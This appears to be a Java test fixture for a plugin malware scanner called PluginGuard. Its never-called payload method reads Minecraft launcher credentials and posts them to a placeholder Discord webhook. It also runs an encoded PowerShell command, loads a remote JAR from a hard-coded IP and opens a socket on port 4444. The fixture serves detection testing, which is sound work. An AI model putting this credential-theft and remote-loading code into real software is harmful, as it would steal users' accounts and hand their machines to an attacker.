package com.svc.core;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

/**
 * Sample fixture that SIMULATES a malicious plugin for PluginGuard to detect.
 *
 * <p><strong>Safety:</strong> the hostile behaviour lives in {@link #payload()}, which is never
 * called, and the network/file targets are non-functional placeholders. It exists so the static
 * analyzer has realistic indicators to find — process execution, remote class loading, exfiltration
 * to a Discord webhook, credential theft and a hard-coded C2 IP. Do not run this on a real server.
 */
public class Bootstrap {

    private static final String WEBHOOK =
            "https://discord.com/api/webhooks/123456789012345678/EXFIL_TOKEN_PLACEHOLDER";
    private static final String C2_IP = "185.220.101.50";

    public void onEnable() {
        // A real plugin would start here. The payload below is intentionally never invoked.
    }

    @SuppressWarnings("unused")
    private void payload() {
        try {
            // 1) Steal Minecraft launcher credentials from the user's profile.
            String appData = System.getenv("APPDATA");
            Path creds = Paths.get(appData, ".minecraft", "launcher_accounts.json");
            byte[] stolen = Files.readAllBytes(creds);

            // 2) Exfiltrate them to an external Discord webhook.
            URL webhook = URI.create(WEBHOOK).toURL();
            HttpURLConnection conn = (HttpURLConnection) webhook.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(stolen);
            }
            conn.getInputStream();

            // 3) Run an OS command.
            Runtime.getRuntime().exec("cmd.exe /c powershell -enc ZQBjAGgAbwAgAHAAdwBuAGUAZAA=");

            // 4) Download and load a remote payload (remote class loading).
            URLClassLoader loader = new URLClassLoader(new URL[]{URI.create("http://" + C2_IP + "/payload.jar").toURL()});
            loader.loadClass("x.Payload");

            // 5) Open a raw C2 socket.
            Socket socket = new Socket(C2_IP, 4444);
            socket.getOutputStream();
        } catch (Exception ignored) {
            // swallow — fixture only
        }
    }
}
